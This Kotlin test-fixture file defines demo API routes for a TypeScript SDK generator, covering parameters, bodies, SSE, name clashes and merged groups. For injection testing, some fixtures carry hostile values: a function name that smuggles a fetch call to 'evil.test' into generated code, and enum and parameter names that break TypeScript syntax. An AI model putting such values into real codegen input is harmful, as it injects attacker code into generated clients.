package io.peekandpoke.funktor.codegen

import io.peekandpoke.funktor.rest.ApiFeature
import io.peekandpoke.funktor.rest.ApiRoutes
import io.peekandpoke.funktor.rest.docs.codeGen
import io.peekandpoke.funktor.rest.docs.docs
import io.peekandpoke.ultra.codegen.model.TsUrlParamClaims
import io.peekandpoke.ultra.codegen.sdk.TsSdkContributor
import io.peekandpoke.ultra.datetime.MpInstant
import io.peekandpoke.ultra.datetime.MpLocalDate
import io.peekandpoke.ultra.remote.ApiResponse
import io.peekandpoke.ultra.remote.TypedApiEndpoint
import io.peekandpoke.ultra.remote.api
import io.peekandpoke.ultra.remote.apiList
import kotlinx.serialization.Contextual
import kotlinx.serialization.Serializable

@Serializable
data class FxTalkModel(val id: String, val title: String)

@Serializable
data class FxSpeakerModel(val name: String, val bio: String?)

/** A group of parameterless routes — the shape the generator supports today. */
class FxTalksApiRoutes : ApiRoutes("fx-talks", authFloor = { public() }) {

    val listTalks = TypedApiEndpoint
        .Get(uri = "/api/fx/talks", response = FxTalkModel.serializer().apiList())
        .mount {
            docs { name = "List all talks" }
                .codeGen { funcName = "listTalks" }
                .handle { ApiResponse.ok(emptyList()) }
        }

    /** No `funcName`, so the member name is derived from method + pattern. */
    val undeclared = TypedApiEndpoint
        .Get(uri = "/api/fx/talks/latest", response = FxTalkModel.serializer().api())
        .mount {
            handle { ApiResponse.ok(FxTalkModel("t-1", "Hello")) }
        }
}

/** A second group, so the aggregate really aggregates. */
class FxSpeakersApiRoutes : ApiRoutes("fx-speakers", authFloor = { public() }) {

    val listSpeakers = TypedApiEndpoint
        .Get(uri = "/api/fx/speakers", response = FxSpeakerModel.serializer().apiList())
        .mount {
            docs { name = "List all speakers" }
                .codeGen {
                    funcName = "listSpeakers"
                    tag("public")
                }
                .handle { ApiResponse.ok(emptyList()) }
        }
}

/** Path and query parameters, including a defaulted one, a nullable one, an enum and a value class. */
class FxParamApiRoutes : ApiRoutes("fx-params", authFloor = { public() }) {

    data class Params(
        /** Fills the `{id}` placeholder. */
        val id: FxTalkId,
        /** Not in the pattern, so it becomes a query parameter. Defaulted, so optional in TS. */
        val page: Int = 1,
        val search: String? = null,
        val order: FxOrder = FxOrder.ASC,
        val exact: Boolean = false,
    )

    val getTalk = TypedApiEndpoint
        .Get(uri = "/api/fx/talks/{id}", response = FxTalkModel.serializer().api())
        .mount(Params::class) {
            docs { name = "Get one talk" }
                .codeGen { funcName = "getTalk" }
                .handle { ApiResponse.ok(FxTalkModel(it.id.value, "Hello")) }
        }
}

enum class FxOrder { ASC, DESC }

@JvmInline
value class FxTalkId(val value: String)

/**
 * A parameter whose wire form is not provable, used to prove the generator refuses by name.
 *
 * The placeholder is required: funktor itself rejects a non-optional PARAMS property that is not in
 * the pattern (`TypedRoute.validateUriPattern`, `funktor/core/.../broker/TypedRoute.kt:170`), so
 * without it this never reaches the generator at all. That rule is also why every QUERY parameter is
 * optional in the emitted signature — a query parameter must have a Kotlin default to be legal.
 */
class FxBadParamApiRoutes : ApiRoutes("fx-bad-params", authFloor = { public() }) {

    data class Params(val model: FxTalkModel)

    val broken = TypedApiEndpoint
        .Get(uri = "/api/fx/broken/{model}", response = FxTalkModel.serializer().api())
        .mount(Params::class) {
            codeGen { funcName = "broken" }.handle { ApiResponse.ok(it.model) }
        }
}

/** Request bodies, with and without URL parameters. */
class FxBodyApiRoutes : ApiRoutes("fx-body", authFloor = { public() }) {

    data class Params(val id: String)

    val createTalk = TypedApiEndpoint
        .Post(
            uri = "/api/fx/talks",
            body = FxSaveTalkRequest.serializer(),
            response = FxTalkModel.serializer().api(),
        )
        .mount {
            docs { name = "Create a talk" }
                .codeGen { funcName = "createTalk" }
                .handle { ApiResponse.ok(FxTalkModel("t-1", it.title)) }
        }

    val updateTalk = TypedApiEndpoint
        .Put(
            uri = "/api/fx/talks/{id}",
            body = FxSaveTalkRequest.serializer(),
            response = FxTalkModel.serializer().api(),
        )
        .mount(Params::class) {
            docs { name = "Update a talk" }
                .codeGen { funcName = "updateTalk" }
                .handle { params, body -> ApiResponse.ok(FxTalkModel(params.id, body.title)) }
        }
}

/**
 * A request type reachable ONLY as a body.
 *
 * Deliberately not referenced by any response: if the body were merely named rather than walked, this
 * would never be declared in `models.ts` and the client would import a type that does not exist.
 */
@Serializable
data class FxSaveTalkRequest(val title: String, val durationMinutes: Int)

/** Server-sent events. Emitted UNTYPED: the stream's payload type is not on the route. */
class FxSseApiRoutes : ApiRoutes("fx-sse", authFloor = { public() }) {

    data class Params(val room: String)

    val watch = TypedApiEndpoint
        .Sse(uri = "/api/fx/watch/{room}")
        .mount(Params::class) {
            codeGen { funcName = "watch" }.handle { }
        }
}

/** Two routes whose `funcName` collides, so the duplicate-member guard can be provoked. */
class FxClashApiRoutes : ApiRoutes("fx-clash", authFloor = { public() }) {

    val a = TypedApiEndpoint
        .Get(uri = "/api/fx/a", response = FxTalkModel.serializer().api())
        .mount {
            codeGen { funcName = "clashingMemberXyz" }.handle { ApiResponse.ok(FxTalkModel("a", "A")) }
        }

    val b = TypedApiEndpoint
        .Get(uri = "/api/fx/b", response = FxTalkModel.serializer().api())
        .mount {
            codeGen { funcName = "clashingMemberXyz" }.handle { ApiResponse.ok(FxTalkModel("b", "B")) }
        }
}

class FxDemoApiFeature(private val groups: List<ApiRoutes>) : ApiFeature {
    override val name: String = "FxDemo"
    override val description: String = "A demo feature for the TypeScript generator."
    override fun getRouteGroups(): List<ApiRoutes> = groups
}

/** Runs a contributor's claim phase in isolation, returning the registry it filled. */
fun claimsOf(contributor: TsSdkContributor): TsUrlParamClaims =
    TsUrlParamClaims().also { contributor.claimUrlParams(it.scopeFor(contributor.name)) }

/** Parameters whose wire form comes from a CLAIM rather than from reflection. */
class FxClaimedParamApiRoutes : ApiRoutes("fx-claimed", authFloor = { public() }) {

    data class Params(
        val at: MpInstant,
        val until: MpLocalDate? = null,
    )

    val eventsSince = TypedApiEndpoint
        .Get(uri = "/api/fx/events/{at}", response = FxStampedModel.serializer().apiList())
        .mount(Params::class) {
            docs { name = "Events since a point in time" }
                .codeGen { funcName = "eventsSince" }
                .handle { ApiResponse.ok(emptyList()) }
        }
}

/**
 * Carries an `MpInstant` in its BODY, while [FxClaimedParamApiRoutes] carries one as a URL parameter.
 *
 * That pairing is the point: the same Kotlin type is an OBJECT in JSON and a STRING in a URL, which is
 * why the two claim registries are independent. Without a body occurrence the test asserting this was
 * true by construction and would have survived merging them.
 */
@Serializable
data class FxStampedModel(
    val id: String,
    @Contextual val at: MpInstant,
)

/** A feature used by the kontainer wiring spec, kept separate so its file name is distinctive. */
class FxWiringApiFeature : ApiFeature {
    override val name: String = "FxWiring"
    override val description: String = "Wiring check feature."
    override fun getRouteGroups(): List<ApiRoutes> = listOf(FxTalksApiRoutes())
}

/**
 * Two GROUPS of one feature declaring the same member name, with DIFFERENT response types.
 *
 * Legal and real: `FunktorClusterApiFeature` returns seven groups, three of which declare
 * `funcName = "list"`. The duplicate guard only fires within a group, so this must still emit
 * correctly rather than give one group the other's schema.
 */
class FxSharedNameTalksRoutes : ApiRoutes("fx-shared-talks", authFloor = { public() }) {
    val list = TypedApiEndpoint
        .Get(uri = "/api/fx/shared/talks", response = FxTalkModel.serializer().apiList())
        .mount { codeGen { funcName = "list" }.handle { ApiResponse.ok(emptyList()) } }
}

class FxSharedNameSpeakersRoutes : ApiRoutes("fx-shared-speakers", authFloor = { public() }) {
    val list = TypedApiEndpoint
        .Get(uri = "/api/fx/shared/speakers", response = FxSpeakerModel.serializer().api())
        .mount { codeGen { funcName = "list" }.handle { ApiResponse.ok(FxSpeakerModel("a", null)) } }
}

/** A `funcName` that is not a TypeScript identifier — it lands in identifier position. */
class FxHostileFuncNameRoutes : ApiRoutes("fx-hostile", authFloor = { public() }) {
    val evil = TypedApiEndpoint
        .Get(uri = "/api/fx/evil", response = FxTalkModel.serializer().api())
        .mount {
            codeGen {
                funcName = "pwn = fetch('https://evil.test')\n    readonly listTalks"
            }.handle { ApiResponse.ok(FxTalkModel("t", "T")) }
        }
}

/** A parameter whose Kotlin name is not a TypeScript identifier. */
class FxHostileParamRoutes : ApiRoutes("fx-hostile-param", authFloor = { public() }) {

    data class Params(val `a b`: String)

    val weird = TypedApiEndpoint
        .Get(uri = "/api/fx/weird/{a b}", response = FxTalkModel.serializer().api())
        .mount(Params::class) {
            codeGen { funcName = "weird" }.handle { ApiResponse.ok(FxTalkModel("t", "T")) }
        }
}

/** An enum whose constant names are not identifier-shaped. */
enum class FxHostileOrder { `a' | string, x: any, z: 'b`, SANE }

class FxHostileEnumRoutes : ApiRoutes("fx-hostile-enum", authFloor = { public() }) {

    data class Params(val id: String, val order: FxHostileOrder = FxHostileOrder.SANE)

    val listing = TypedApiEndpoint
        .Get(uri = "/api/fx/listing/{id}", response = FxTalkModel.serializer().api())
        .mount(Params::class) {
            codeGen { funcName = "listing" }.handle { ApiResponse.ok(FxTalkModel("t", "T")) }
        }
}

/**
 * Two `ApiRoutes` instances sharing ONE group name — legal, and real.
 *
 * `funktor:auth` declares `ApiRoutes("login")` twice (`AuthApi.kt:34` public, `:216` authenticated).
 * They are one logical group to a client, so they must merge into one class rather than emit two
 * classes with the same name.
 */
class FxSplitPublicRoutes : ApiRoutes("fx-split", authFloor = { public() }) {
    val open = TypedApiEndpoint
        .Get(uri = "/api/fx/split/open", response = FxTalkModel.serializer().api())
        .mount { codeGen { funcName = "openPart" }.handle { ApiResponse.ok(FxTalkModel("a", "A")) } }
}

class FxSplitSecuredRoutes : ApiRoutes("fx-split", authFloor = { public() }) {
    val secured = TypedApiEndpoint
        .Get(uri = "/api/fx/split/secured", response = FxSpeakerModel.serializer().api())
        .mount { codeGen { funcName = "securedPart" }.handle { ApiResponse.ok(FxSpeakerModel("a", null)) } }
}

/** Same-named groups whose MEMBERS also collide — the merge must still catch that. */
class FxSplitClashRoutes : ApiRoutes("fx-split", authFloor = { public() }) {
    val clash = TypedApiEndpoint
        .Get(uri = "/api/fx/split/clash", response = FxTalkModel.serializer().api())
        .mount { codeGen { funcName = "openPart" }.handle { ApiResponse.ok(FxTalkModel("b", "B")) } }
}
